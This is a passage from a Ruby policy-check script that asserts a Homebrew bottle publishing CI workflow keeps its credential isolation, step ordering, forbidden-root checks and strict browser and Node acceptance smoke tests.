        public_bottle_verifier.include?("await reader.read()") &&
        public_bottle_verifier.include?("await rm(options.out, { force: true })") &&
        !public_bottle_verifier.include?("fetchHomebrewBottleBytes") &&
        !public_bottle_verifier.include?("response.arrayBuffer") &&
        bottle_fetch.include?("fetchHomebrewBottleResponse") &&
        bottle_fetch.include?("await response.body?.cancel()") &&
        prefix_campaign.include?("MAX_COMPRESSED_BOTTLE_BYTES") &&
        prefix_campaign.include?("PUBLICATION_LIMITS_PATH") &&
        prefix_campaign.include?("READBACK_FETCH_PATH"),
        "trusted public bottle streaming or campaign archive bounds changed")
  index_compose_run = index_compose.fetch("run")
  check(index_compose.keys.sort == %w[env name run shell] &&
        index_compose["env"] == {
          "KANDELO_HOMEBREW_EXISTING_INDEX" =>
            "${{ steps.existing-index.outputs.layout }}",
          "KANDELO_HOMEBREW_FORCE" => "${{ inputs.force }}",
          "KANDELO_HOMEBREW_TAP_COMMIT" =>
            "${{ needs.plan.outputs.tap-sha }}",
        }, "publisher unfinalized index recovery is not bound to force")
  [
    "credential-free index composer received $secret_name",
    'args+=(--child-layout "$layout" --child-receipt "$receipt")',
    'args+=(--existing-layout "$existing")',
    'if [ "$KANDELO_HOMEBREW_FORCE" = "true" ]; then',
    'args+=(--recover-unfinalized-tap-root "$GITHUB_WORKSPACE/tap")',
    "args+=(--recover-unfinalized-tap-checkout-commit \\",
    '"$KANDELO_HOMEBREW_PREPARED_TAP_COMMIT")',
    "scripts/homebrew-oci-layout.py merge-index",
    '--tap-commit "$KANDELO_HOMEBREW_TAP_COMMIT"',
    '--out-layout "$RUNNER_TEMP/homebrew-complete-index/layout"',
    '--out-receipt "$RUNNER_TEMP/homebrew-complete-index/layout-receipt.json"',
  ].each do |fragment|
    check(index_compose_run.include?(fragment),
          "publisher complete version-index composition lacks #{fragment}")
  end
  index_publish_run = index_publish.fetch("run")
  [
    "scripts/homebrew-ghcr-upload.sh",
    '--layout "$RUNNER_TEMP/homebrew-complete-index/layout"',
    '--layout-receipt "$RUNNER_TEMP/homebrew-complete-index/layout-receipt.json"',
    "--auth-mode github-token",
    "--require-pat false",
    "--destination-mode repository",
    '--target-main-contains-sha "$KANDELO_HOMEBREW_TAP_COMMIT"',
    "authority_args+=(--exact-kandelo-main-sha \\",
    "authority_args+=(--kandelo-main-contains-sha \\",
    "require-exact-kandelo-main.sh",
    "require-repository-main-contains.sh",
    '"${authority_args[@]}"',
    '--out-json "$RUNNER_TEMP/homebrew-complete-index/transport-receipt.json"',
  ].each do |fragment|
    check(index_publish_run.include?(fragment),
          "publisher isolated version-index transport lacks #{fragment}")
  end
  check(index_steps.index(index_validate) < index_steps.index(index_import) &&
        index_steps.index(index_import) < index_steps.index(index_compose) &&
        index_steps.index(index_compose) < index_steps.index(index_publish) &&
        index_steps.index(index_publish) < index_steps.index(index_publication_upload),
        "publisher version-index validation, aggregation, transport, or evidence order changed")
  check(index_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") } &&
        index_steps.count { |step| step["uses"] == UPLOAD_ACTION } == 1,
        "credentialed version-index publisher publishes diagnostics")

  privileged_runs = [upload_steps, index_steps].flatten.filter_map { |step| step["run"] }.join("\n")
  %w[
    homebrew-bottle-build.sh homebrew-formula-source-digest.rb
    homebrew-validate-formula-source-closure.sh
  ].each do |forbidden|
    check(!privileged_runs.include?(forbidden),
          "packages:write phase can execute Formula-controlled source through #{forbidden}")
  end
  check(!privileged_runs.match?(/(?:^|[[:space:]])ruby(?:[[:space:]]|$)/),
        "packages:write phase executes Ruby")

  canonical_build = named_step(verify_steps,
                               "Validate build handoff and reconstruct canonical bottle JSON").fetch("run")
  canonical_receipt = named_step(verify_steps,
                                 "Validate receipt against exact bottle bytes").fetch("run")
  [canonical_build, canonical_receipt].each do |run|
    check(run.include?('--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"') &&
          run.include?('--tap-name "$KANDELO_HOMEBREW_TAP_NAME"') &&
          run.include?('--out-bottle-json "$RUNNER_TEMP/homebrew-verified-input/bottle.json"'),
          "publisher does not reconstruct canonical bottle JSON")
  end
  check(canonical_receipt.include?("bash scripts/dev-shell.sh env \\") &&
        canonical_receipt.include?(resolved_taps_forwarding),
        "publisher verifier receipt validation drops immutable resolved taps at the dev-shell boundary")
  check_forbidden_root_args(canonical_build,
                            "publisher verifier handoff validation", trusted_runner_roots)
  check_forbidden_root_args(canonical_receipt,
                            "publisher verifier receipt validation", trusted_runner_roots)
  check(canonical_build.include?('--tap-root "$GITHUB_WORKSPACE/tap"'),
        "publisher does not bind dependency provenance to the exact tap")
  merge_run = named_step(verify_steps,
                         "Compose only reconstructed bottle metadata into the fresh tap").fetch("run")
  [
    "scripts/homebrew-merge-bottle-json.sh", '--bottle-json "$BOTTLE_JSON"',
    '--tap-repository "$TAP_REPOSITORY"', '--tap-name "$TAP_NAME"',
    '--release-tag "$RELEASE_TAG"',
    '--expected-sha256 "$BOTTLE_SHA256"', '--expected-root-url "$BOTTLE_ROOT_URL"',
    'merged_tap="$RUNNER_TEMP/homebrew-merged-tap"',
    'cp -a "$GITHUB_WORKSPACE/tap" "$merged_tap"',
    '""|"Formula/$FORMULA.rb") ;;',
    'bottle merge modified the archived source tap',
  ].each do |fragment|
    check(merge_run.include?(fragment), "publisher canonical bottle merge lacks #{fragment}")
  end

  anonymous_run = named_step(verify_steps,
                             "Select exact anonymous bottle bytes for runtime validation").fetch("run")
  [
    "scripts/homebrew-verify-public-bottle.ts", '--url "$BOTTLE_URL"',
    '--sha256 "$BOTTLE_SHA256"', '--bytes "$BOTTLE_BYTES"', '--out "$runtime_bottle"',
    'runtime_bottle="$bottle_cache/$BOTTLE_FILENAME"',
    'actual_sha="$(sha256sum "$runtime_bottle"',
  ].each do |fragment|
    check(anonymous_run.include?(fragment), "publisher anonymous bottle readback lacks #{fragment}")
  end
  check(!anonymous_run.include?('basename "$BOTTLE_ARCHIVE"'),
        "publisher renames a selected bottle without validated Homebrew metadata")
  check((credential_names & anonymous_run.scan(/[A-Z][A-Z0-9_]+/)).empty?,
        "publisher anonymous bottle readback references a credential")
  index_verify = named_step(
    verify_steps, "Validate exact public Homebrew index traversal without credentials"
  )
  check(index_verify.keys.sort == %w[env if name run shell] &&
        index_verify["if"] ==
          "${{ !inputs.dry-run && steps.index-publication.outcome == 'success' }}" &&
        index_verify["shell"] == "bash" && index_verify["env"] == {
          "KANDELO_HOMEBREW_ARCH" => "${{ matrix.arch }}",
          "KANDELO_HOMEBREW_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "KANDELO_HOMEBREW_TAP_NAME" => "${{ inputs.tap-name }}",
        }, "publisher exact public Homebrew index verification mapping changed")
  index_verify_run = index_verify.fetch("run")
  [
    "public Homebrew index verifier received $secret_name",
    "validate-index-receipt", "validate-publication-receipt", "--kind index",
    "oras cp", "--from-registry-config", "--to-oci-layout",
    "scripts/homebrew-oci-layout.py validate-index",
    'tap_repository="$(printf \'%s\' "$KANDELO_HOMEBREW_TAP_REPOSITORY" | tr \'[:upper:]\' \'[:lower:]\')"',
    repository_remote,
    '.manifest_digest == $child[0].oci.manifest.digest',
    '.bottle_sha256 == $child[0].bottle.sha256',
  ].each do |fragment|
    check(index_verify_run.include?(fragment),
          "publisher exact public Homebrew index verification lacks #{fragment}")
  end
  check(index_verify_run.scan(repository_remote).length == 1 &&
        !index_verify_run.include?('remote="ghcr.io/${tap_name}/'),
        "publisher public Homebrew index verification is not repository-rooted")
  verifier_runtime_step = named_step(verify_steps,
                                     "Materialize Formula verification platform runtime")
  javascript_step = named_step(verify_steps, "Install JavaScript dependencies")
  javascript_index = verify_steps.index(javascript_step)
  verifier_runtime_index = verify_steps.index(verifier_runtime_step)
  isolated_verifier_index = verify_steps.index(
    named_step(
      verify_steps, "Force-pour and test the exact selected bottle without credentials"
    )
  )
  check(
    !javascript_index.nil? && !verifier_runtime_index.nil? &&
      !isolated_verifier_index.nil? &&
      verifier_runtime_index == javascript_index + 1 &&
      verifier_runtime_index < isolated_verifier_index,
    "publisher must materialize the portable Formula cache immediately after " \
    "JavaScript setup and before isolated verification"
  )
  check(
    verify_steps.none? do |step|
      step.fetch("run", "").to_s.include?("prepare-browser") ||
        step.fetch("run", "").to_s.include?("--pending-selection-root")
    end,
    "per-Formula verification must not prepare or require the complete shell selection"
  )
  # No later verifier step may resolve another package into binaries/: that
  # would replace the mirrors after their canonical generations were copied.
  post_materialization_steps =
    verify_steps[(verifier_runtime_index + 1)...isolated_verifier_index]
  post_materialization_writers = post_materialization_steps.filter_map do |step|
    run = step.fetch("run", "").to_s
    next unless [
      "--binaries-dir", "prepare-browser", "fetch-binaries",
      "materialize-resolver-binaries", "resolve-binary",
    ].any? { |fragment| run.include?(fragment) }

    step.fetch("name", "<unnamed>")
  end
  check(
    post_materialization_writers.empty?,
    "publisher rewrites binaries after portable Formula cache materialization: " \
    "#{post_materialization_writers.join(', ')}"
  )
  check(verifier_runtime_step.keys.sort == %w[id name run shell] &&
        verifier_runtime_step["id"] == "formula-verification-runtime" &&
        verifier_runtime_step["shell"] == "bash",
        "publisher Formula verification runtime mapping changed")
  verifier_runtime_run = verifier_runtime_step.fetch("run")
  [
    "bash scripts/dev-shell.sh bash -c", 'host="$(rustc -vV | sed -n "s/^host: //p")"',
    'cargo build --release -p xtask --target "$host" --quiet',
    'xtask="$PWD/target/$host/release/xtask"',
    '[ -f "$xtask" ] && [ ! -L "$xtask" ] && [ -x "$xtask" ]',
    '[ "$(realpath -- "$xtask")" = "$xtask" ]',
    'bash scripts/seal-homebrew-formula-checker.sh',
    '--root "$PWD"', '--checker "$xtask"',
    '[ "$sealed_xtask" = "$xtask" ]',
    'formula_test_packages="dash,coreutils,grep,sed,rootfs"',
    'for package in ${formula_test_packages//,/ }; do',
    '"$xtask"',
    "build-deps --arch wasm32", '--binaries-dir "$PWD/binaries"',
    '--fetch-only resolve "$package"',
    'cache_root="$("$xtask" build-deps cache-root)"',
    'case "$cache_root" in',
    'bash scripts/materialize-resolver-binaries.sh',
    '"$PWD/binaries" "$cache_root"',
    'formula-test-program-packages.json',
    'build-deps program-index-selected',
    '--source-repo-root "$PWD"',
    'printf "xtask-bin=%s\\n" "$xtask" >>"$GITHUB_OUTPUT"',
  ].each do |fragment|
    check(verifier_runtime_run.include?(fragment),
          "publisher Formula verification runtime lacks #{fragment}")
  end
  check(!verifier_runtime_run.include?("cargo run") &&
        !verifier_runtime_run.include?("GITHUB_ENV"),
        "publisher Formula verification checker is rebuilt or leaked job-wide")
  sidecar_run = named_step(verify_steps,
                           "Generate sidecars from the selected bottle").fetch("run")
  check(sidecar_run.include?('KANDELO_HOMEBREW_BOTTLE_ARCHIVE="$RUNTIME_BOTTLE"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_TAP_ROOT="$RUNNER_TEMP/homebrew-merged-tap-postverify"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_FORMULA_SOURCE_ROOT="$GITHUB_WORKSPACE/tap-postverify"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_BUILD_ROOT="$GITHUB_WORKSPACE/kandelo-sysroot-build"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_BOTTLE_JSON="$RUNNER_TEMP/homebrew-verified-input/bottle.json"') &&
        sidecar_run.include?('KANDELO_HOMEBREW_DEPENDENCY_PROVENANCE="$DEPENDENCY_PROVENANCE"') &&
        sidecar_run.include?("scripts/homebrew-generate-sidecars-from-env.sh"),
        "publisher sidecars do not use archived Formula facts and the anonymously selected bottle")
  forbidden_root_json_fragments = [
    'export KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON="$(jq -cn \\',
    '--arg github_workspace "$GITHUB_WORKSPACE" \\',
    '--arg runner_workspace "$(dirname "$GITHUB_WORKSPACE")" \\',
    '--arg runner_temp "$RUNNER_TEMP" \\',
    '--arg build_home "/home/kandelo-homebrew-build" \\',
    "'[\u0024github_workspace, \u0024runner_workspace, \u0024runner_temp, \u0024build_home]')\"",
  ]
  forbidden_root_json_fragments.each do |fragment|
    check(sidecar_run.include?(fragment),
          "publisher sidecar inspection lacks trusted forbidden-root source #{fragment}")
  end
  sidecar_env_forwarding = [
    'bash scripts/dev-shell.sh env \\',
    resolved_taps_forwarding,
    'KANDELO_HOMEBREW_TAP_NAME="$KANDELO_HOMEBREW_TAP_NAME" \\',
    'KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON="$KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON" \\',
  ]
  sidecar_env_forwarding.each do |fragment|
    check(sidecar_run.include?(fragment),
          "publisher sidecar inspection drops explicit identity or root data at the dev-shell boundary")
  end
  verifier_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-generate-sidecars-from-env.sh"))
  bottle_inspector_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-inspect-bottle.py"))
  formula_digest_source = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-formula-source-digest.rb")
  )
  bottle_inspector_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-inspect-bottle.sh")
  )
  formula_digest_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-oci-layout.sh")
  )
  fingerprint_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-sysroot-fingerprint.sh"))
  merge_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-merge-bottle-json.sh"))
  check_sidecar_sysroot_binding(verifier_source, fingerprint_source)
  check_sidecar_checkout_binding(verifier_source)
  check(verifier_source.include?('--dependency-tap-root "$FORMULA_SOURCE_ROOT"'),
        "sidecar generator validates dependency provenance from its reconstructed dirty tap")
  [
    'test_contract == "support-data"',
    "support-data Formulae require a separate guest lifecycle gate",
    '"name": "support_data_test"',
    "runtime_support =",
  ].each do |fragment|
    check(verifier_source.include?(fragment),
          "sidecar generator weakens support-data runtime claims: #{fragment}")
  end
  check(verifier_source.include?('KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON') &&
        verifier_source.include?('forbidden_roots = json.loads') &&
        verifier_source.include?('inspection_command.extend(("--forbidden-root", forbidden_root))'),
        "sidecar generator does not preserve trusted forbidden-root inspection")
  check(verifier_source.include?('"--selected-formula",') &&
        verifier_source.include?('os.environ["FORMULA_PATH"]') &&
        bottle_inspector_source.include?('"--receipt-equivalent"') &&
        bottle_inspector_source.include?('normalization not in {"exact", "bottle-block-removed"}') &&
        formula_digest_source.include?('def receipt_match_kind(selected, receipt)') &&
        formula_digest_source.include?(
          'return nil if selected.bottle_range.nil? || !receipt.bottle_range.nil?'
        ) &&
        formula_digest_source.include?('removal_end = selected.bottle_range.end') &&
        formula_digest_source.include?('lines[removal_end + 1] == "\\n"') &&
        formula_digest_source.include?(
          'lines.slice!(selected.bottle_range.begin..removal_end)'
        ) &&
        formula_digest_source.include?('lines.join == receipt.source'),
        "sidecar generator does not enforce one-way canonical Formula receipt normalization")
  [
    "SELECTED_WASM32_BOTTLE_FORMULA",
    "ARCHIVED_WASM64_RECEIPT_FORMULA",
    "non-bottle-receipt-drift",
    "replaced-bottle-receipt",
  ].each do |fragment|
    check(bottle_inspector_test.include?(fragment),
          "Formula receipt normalization regression coverage lacks #{fragment}")
  end
  [
    "mid-class-archived.rb",
    "mid-class-selected.rb",
    "mid-class-extra-blank.rb",
    "Formula receipt rejected Homebrew's canonical mid-class bottle-block removal",
    "Formula receipt ignored non-Homebrew whitespace after a mid-class bottle block",
  ].each do |fragment|
    check(formula_digest_test.include?(fragment),
          "Formula identity regression coverage lacks #{fragment}")
  end
  [verifier_source, merge_source].each do |source|
    check(!source.include?("HOMEBREW_BREW_FILE") &&
          !source.include?("brew info") &&
          !source.include?("bottle --merge") &&
          !source.include?("homebrew-patched-launcher"),
          "post-build verifier evaluates Formula Ruby through Homebrew")
  end
  browser_step = named_step(
    verify_steps, "Build and strictly smoke the file-formula browser image"
  )
  check(
    browser_step["if"] ==
      "${{ matrix.formula == 'file-formula' && matrix.arch == 'wasm32' }}",
    "publisher campaign no longer retains the dynamic file-formula browser smoke"
  )
  browser_run = browser_step.fetch("run")
  browser_test_source = File.read(
    File.join(REPO_ROOT, "apps/browser-demos/test/homebrew-brewfile-vfs.spec.ts")
  )
  [
    "bash -s <<'KANDELO_HOMEBREW_BROWSER_SMOKE'",
    '. scripts/homebrew-guest-layout.sh',
    'file_executable="$HOMEBREW_GUEST_PREFIX/bin/file"',
    'file_argv_json=\'["file","--version"]\'',
    'first(.packages[] | select(.name == $formula)).version',
    'first(.packages[] | select(.name == $formula)).formula_revision',
    'revision_suffix="_${file_formula_revision}"',
    'file_upstream_version="${file_pkg_version%"$revision_suffix"}"',
    'file pkg_version does not carry its Formula revision',
    'file_expected_stdout="file-${file_upstream_version}"',
    'KANDELO_HOMEBREW_BUILD_ROOT="$GITHUB_WORKSPACE/kandelo-sysroot-build"',
    '[ ! -e "$browser_public_dir" ] && [ ! -L "$browser_public_dir" ]',
    'image_sha256="$(sha256sum "$browser_vfs"',
    'served file browser VFS differs from the composed image',
    'kernel="$(bash scripts/resolve-binary.sh kernel.wasm)"',
    'local-binaries/.kandelo-local-generations/wasm32/kernel)',
    'kernel_generation="$(dirname "$kernel")"',
    'kernel_identity="$(dirname "$kernel_generation")"',
    'kernel_session="$(basename "$kernel_generation")"',
    'kernel_cache_key="$(basename "$kernel_identity")"',
    '[[ ! "$kernel_cache_key" =~ ^[0-9a-f]{64}$ ]]',
    '"homebrew-verifier-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"',
    '[ ! -f "$kernel_identity/.$kernel_session.publication-claimed" ]',
    '[ -L "$kernel_identity/.$kernel_session.publication-claimed" ]',
    '[ ! -f "$kernel" ] || [ -L "$kernel" ]',
    'kernel_sha256="$(sha256sum "$kernel"',
    'KANDELO_HOMEBREW_ACCEPTANCE_VFS_URL="$KANDELO_HOMEBREW_ACCEPTANCE_VFS_URL"',
    'KANDELO_HOMEBREW_ACCEPTANCE_VFS_SHA256="$KANDELO_HOMEBREW_ACCEPTANCE_VFS_SHA256"',
    'KANDELO_HOMEBREW_ACCEPTANCE_KERNEL_SHA256="$KANDELO_HOMEBREW_ACCEPTANCE_KERNEL_SHA256"',
    'KANDELO_HOMEBREW_ACCEPTANCE_EXECUTABLE="$KANDELO_HOMEBREW_ACCEPTANCE_EXECUTABLE"',
    'KANDELO_HOMEBREW_ACCEPTANCE_ARGV_JSON="$KANDELO_HOMEBREW_ACCEPTANCE_ARGV_JSON"',
    'KANDELO_HOMEBREW_ACCEPTANCE_EXPECTED_STDOUT="$KANDELO_HOMEBREW_ACCEPTANCE_EXPECTED_STDOUT"',
    'KANDELO_BROWSER_DEMO_INPUTS="homebrew-vfs-test"',
    'test/homebrew-brewfile-vfs.spec.ts',
    "'{schema: 1, formula: $formula, arch: $arch,",
    "KANDELO_HOMEBREW_BROWSER_SMOKE\n",
    "--reporter=json", ".stats.expected == 1", ".stats.unexpected == 0",
    ".stats.flaky == 0", ".stats.skipped == 0",
  ].each do |fragment|
    check(browser_run.include?(fragment), "publisher strict browser smoke lacks #{fragment}")
  end
  check(browser_test_source.include?(
          'test("the exact Homebrew VFS boots in Chromium"'
        ) &&
        browser_test_source.include?("expect(result.imageSha256).toBe(imageSha256)") &&
        browser_test_source.include?("expect(result.kernelSha256).toBe(kernelSha256)") &&
        browser_test_source.include?("expect(result.exitCode, result.stderr).toBe(0)"),
        "publisher strict browser smoke does not use the exact-artifact package page")
  check(!browser_run.include?("test/kandelo-homebrew.spec.ts") &&
        !browser_run.include?("KANDELO_HOMEBREW_DEFAULT_SHELL") &&
        !browser_run.include?("prepare-browser"),
        "publisher file smoke depends on the complete interactive shell product")
  check(browser_run.scan("npx playwright install chromium --with-deps").length == 1 &&
        browser_run.match?(
          /\(\n\s+cd apps\/browser-demos\n\s+npx playwright install chromium --with-deps\n\s*\)\n\s*bash scripts\/dev-shell\.sh env/
        ), "publisher strict browser smoke does not provision Chromium once in the runner shell")
  direct_browser_env = browser_run.lines.each_cons(2).any? do |command, input|
    command.strip == 'env \\' &&
      input.strip.start_with?('KANDELO_PLAYWRIGHT_PORT=')
  end
  check(direct_browser_env &&
        !browser_run.include?("../../scripts/dev-shell.sh"),
        "publisher strict browser smoke reenters an already active dev shell")
  forbidden_root_json_fragments.each do |fragment|
    check(browser_run.include?(fragment),
          "publisher browser sidecar regeneration lacks trusted forbidden-root source #{fragment}")
  end
  sidecar_env_forwarding.each do |fragment|
    check(browser_run.include?(fragment),
          "publisher browser sidecar regeneration drops explicit identity or root data at the dev-shell boundary")
  end

  acceptance_step = named_step(
    verify_steps, "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
  )
  check(acceptance_step.keys.sort == %w[env if name run shell] &&
        acceptance_step["if"] ==
          "${{ needs.plan.outputs.prefix-campaign-mode != 'true' && " \
          "needs.plan.outputs.package-generation-kind != 'rootfs-wasm32' }}" &&
        acceptance_step["shell"] == "bash" && acceptance_step["env"] == {
          "KANDELO_HOMEBREW_ACCEPTANCE_ARCH" => "${{ matrix.arch }}",
          "KANDELO_HOMEBREW_ACCEPTANCE_DRY_RUN" => "${{ inputs.dry-run }}",
          "KANDELO_HOMEBREW_ACCEPTANCE_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_ACCEPTANCE_REQUIRED" => "${{ inputs.require-vfs-acceptance }}",
        }, "publisher dependency-bearing VFS acceptance mapping changed")
  acceptance_run = acceptance_step.fetch("run")
  [
    'tap_root="$(realpath "$GITHUB_WORKSPACE/tap-postverify")"',
    'policy_dir="$GITHUB_WORKSPACE/tap-postverify/Kandelo"',
    '[ -L "$policy_dir" ] || { [ -e "$policy_dir" ] && [ ! -d "$policy_dir" ]; }',
    'config_candidate="$policy_dir/vfs-acceptance.json"',
    'if [ ! -e "$config_candidate" ] && [ ! -L "$config_candidate" ]; then',
    'required dependency-bearing VFS acceptance selection disappeared after planning',
    'no closure acceptance evidence was produced',
    'tap VFS acceptance configuration must be a regular non-symlink file',
    'config="$(realpath "$config_candidate")"',
    'tap VFS acceptance configuration resolved outside the exact tap checkout',
    'keys == ["argv", "brewfile", "executable", "expected_stdout", "formula", "schema"]',
    'keys == ["argv", "brewfile", "executable", "expected_stdout", "formula", "schema", "shell_config"]',
    'contains("\u000a") == false', 'contains("\u000d") == false',
    'required dependency-bearing VFS acceptance cannot run in dry-run mode',
    'anonymous reads of published GHCR bottles',
    'cp -a "$GITHUB_WORKSPACE/tap-postverify" "$acceptance_tap"',
    'rsync -a "$RUNNER_TEMP/homebrew-sidecars/Formula/" "$acceptance_tap/Formula/"',
    'rsync -a "$RUNNER_TEMP/homebrew-sidecars/Kandelo/" "$acceptance_tap/Kandelo/"',
    'brewfile_candidate="$GITHUB_WORKSPACE/tap-postverify/$brewfile_rel"',
    '[ -f "$brewfile_candidate" ] && [ ! -L "$brewfile_candidate" ]',
    'brewfile="$(realpath "$brewfile_candidate")"',
    'shell_config_candidate="$GITHUB_WORKSPACE/tap-postverify/$shell_config_rel"',
    'tap default-shell config must be a regular non-symlink file',
    'default-shell config resolved outside the exact tap checkout',
    'default-shell config must contain 1 to 65536 bytes',
    '. scripts/homebrew-guest-layout.sh',
    'homebrew_select_guest_layout',
    'jq -e --arg prefix "$HOMEBREW_GUEST_PREFIX"',
    'def executable_under($prefix):',
    'vfs_args+=(--write-profile --shell-config "$shell_config")',
    'node_args+=(--shell-config "$shell_config")',
    'resolver_paths="$acceptance_root/resolved-platform-artifacts.txt"',
    '[ ! -e "$resolver_paths" ] && [ ! -L "$resolver_paths" ]',
    "bash scripts/dev-shell.sh bash -c '",
    'bash scripts/resolve-binary.sh programs/rootfs.vfs >"$1"',
    'bash scripts/resolve-binary.sh kernel.wasm >>"$1"',
    '[ -f "$resolver_paths" ] && [ ! -L "$resolver_paths" ]',
    'resolver_paths_bytes="$(wc -c <"$resolver_paths" | tr -d \'[:space:]\')"',
    '[ "$resolver_paths_bytes" -gt 8192 ]',
    'mapfile -t resolved_platform_artifacts <"$resolver_paths"',
    '[ "${#resolved_platform_artifacts[@]}" -eq 2 ]',
    'base_image="${resolved_platform_artifacts[0]}"',
    'platform base did not resolve from the Kandelo package registry tree',
    'kernel="${resolved_platform_artifacts[1]}"',
    'verification kernel did not resolve from the exact worktree build',
    'shell_package_image="$acceptance_root/shell.vfs.zst"',
    'shell_package_source="$acceptance_root/shell-package-output.json"',
    'runtime_layer_policy="$PWD/homebrew/runtime-layer-policy.json"',
    'lazy_layer="$acceptance_root/kandelo-homebrew-${selected_formula}-layer.bin"',
    'lazy_layer_descriptor="$acceptance_root/kandelo-homebrew-${selected_formula}-layer.json"',
    'xtask="target/$host/release/xtask"',
    '"$xtask" materialize-package-output',
    '--package "$PWD/packages/registry/shell"',
    '--output-name shell',
    '--out "$1"', '--receipt "$2"',
    '--runtime node', '--max-bytes 256MiB', '--no-fallback',
    '--lazy-layer-out "$lazy_layer"',
    '--lazy-layer-descriptor "$lazy_layer_descriptor"',
    '--lazy-layer-base-image "$shell_package_image"',
    '--lazy-layer-base-package-source "$shell_package_source"',
    '--runtime-layer-id "$selected_formula"',
    '--runtime-layer-policy "$runtime_layer_policy"',
    'bash scripts/dev-shell.sh npx tsx',
    'scripts/homebrew-vfs-acceptance-smoke.ts',
    '--base-origin kandelo-package-registry', '--kernel-origin worktree-build',
    '--formula "$selected_formula"',
    '[ "$(jq -er \'.image.sha256\' "$node_evidence")" = "$image_sha256" ]',
    'browser_shell_env=()',
    'KANDELO_HOMEBREW_ACCEPTANCE_DEFAULT_SHELL_PATH=$shell_path',
    'KANDELO_HOMEBREW_ACCEPTANCE_DEFAULT_SHELL_ARGV_JSON=$shell_argv_json',
    '"${browser_shell_env[@]}"',
    'export KANDELO_BROWSER_DEMO_INPUTS="homebrew-vfs-test"',
    'KANDELO_BROWSER_DEMO_INPUTS="$KANDELO_BROWSER_DEMO_INPUTS"',
    'bash ../../scripts/dev-shell.sh env',
    'test/homebrew-brewfile-vfs.spec.ts',
    '--project=chromium --reporter=json >"$1"',
    '\' kandelo-homebrew-vfs-playwright "$playwright_report"',
    'legacy_shell_downloads: 0',
    '.stats.expected == 1', '.stats.unexpected == 0',
    '.stats.flaky == 0', '.stats.skipped == 0',
  ].each do |fragment|
    check(acceptance_run.include?(fragment),
          "publisher dependency-bearing VFS acceptance lacks #{fragment}")
  end
  check(acceptance_run.scan('--reporter=json >"$1"').length == 1 &&
        !acceptance_run.include?('--reporter=json >"$playwright_report"'),
        "publisher captures dev-shell setup stdout in a Playwright JSON report")
  check(!acceptance_run.include?("test/kandelo-homebrew.spec.ts") &&
        !acceptance_run.include?('KANDELO_BROWSER_DEMO_INPUTS="main,kandelo"') &&
        !acceptance_run.include?("prepare-browser"),
        "package VFS acceptance still owns the complete interactive shell proof")
  check(acceptance_run.match?(
          /if \[ ! -e "\$config_candidate" \] && \[ ! -L "\$config_candidate" \]; then\n\s+if \[ "\$KANDELO_HOMEBREW_ACCEPTANCE_REQUIRED" = "true" \]; then\n\s+echo "::error::[^\n]+"\n\s+exit 1\n\s+fi\n\s+echo "::notice::[^\n]+no closure acceptance evidence was produced"\n\s+exit 0/
        ), "publisher does not preserve optional and required VFS acceptance semantics")
  check((credential_names & acceptance_run.scan(/[A-Z][A-Z0-9_]+/)).empty?,
        "publisher dependency-bearing VFS acceptance references a credential")
  sidecar_generation = named_step(verify_steps, "Generate sidecars from the selected bottle")
  sidecar_validation = named_step(
    verify_steps, "Package validated data-only publication handoff"
  )
  check(verify_steps.index(sidecar_generation) < verify_steps.index(acceptance_step) &&
        verify_steps.index(acceptance_step) < verify_steps.index(sidecar_validation),
        "publisher dependency-bearing VFS acceptance runs outside the package-scoped sidecar boundary")

  acceptance_source = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-vfs-acceptance-smoke.ts")
  )
  [
    "allowFallback: false", "createBrowserCandidateMetadata", 'runtime: "node"',
    'runtime: "browser"', 'compatibility_basis: "pending-exact-image-runtime-test"',
    "selected acceptance formula must resolve at least one real package dependency edge",
    "did not select a current successful bottle", "bottle URL is not the repository GHCR blob",
    "is not a Brewfile root", "is not a link owned by acceptance formula",
    "base VFS ABI", "kernel Wasm ABI", "Node acceptance stdout did not contain",
    "expected stdout must be a single-line string",
    "does not match the reviewed shell config",
    "default shell", "must be linked by exactly one selected Homebrew bottle",
    '"--shell-config"',
  ].each do |fragment|
    check(acceptance_source.include?(fragment),
          "Homebrew VFS acceptance verifier lacks #{fragment}")
  end
  browser_acceptance_source = File.read(
    File.join(REPO_ROOT, "apps/browser-demos/pages/homebrew-vfs-test/main.ts")
  )
  browser_acceptance_request_source = File.read(
    File.join(
      REPO_ROOT,
      "apps/browser-demos/pages/homebrew-vfs-test/acceptance-request.ts"
    )
  )
  check(browser_acceptance_source.include?('fetchBytes(request.vfsUrl, "Homebrew VFS image")') &&
        browser_acceptance_source.include?("vfsImage: new Uint8Array(imageBytes)") &&
        browser_acceptance_source.include?("validateHomebrewVfsAcceptanceRequest(request)") &&
        browser_acceptance_request_source.include?("stdin?: string") &&
        browser_acceptance_request_source.include?("pty?: boolean") &&
        browser_acceptance_request_source.include?("MAX_STDIN_BYTES = 64 * 1024") &&
        browser_acceptance_request_source.include?("focused PTY acceptance requires bounded terminal input") &&
        browser_acceptance_request_source.include?('{ kind: "stdio"; stdin?: Uint8Array }') &&
        browser_acceptance_request_source.include?('{ kind: "pty"; input: Uint8Array }') &&
        browser_acceptance_source.include?("kernel.onPtyOutput") &&
        browser_acceptance_source.include?("kernel.ptyWrite(pid, input.input)") &&
        browser_acceptance_source.include?('appendOutput(stdout, bytes, "PTY output")') &&
        !browser_acceptance_source.include?("live-setup") &&
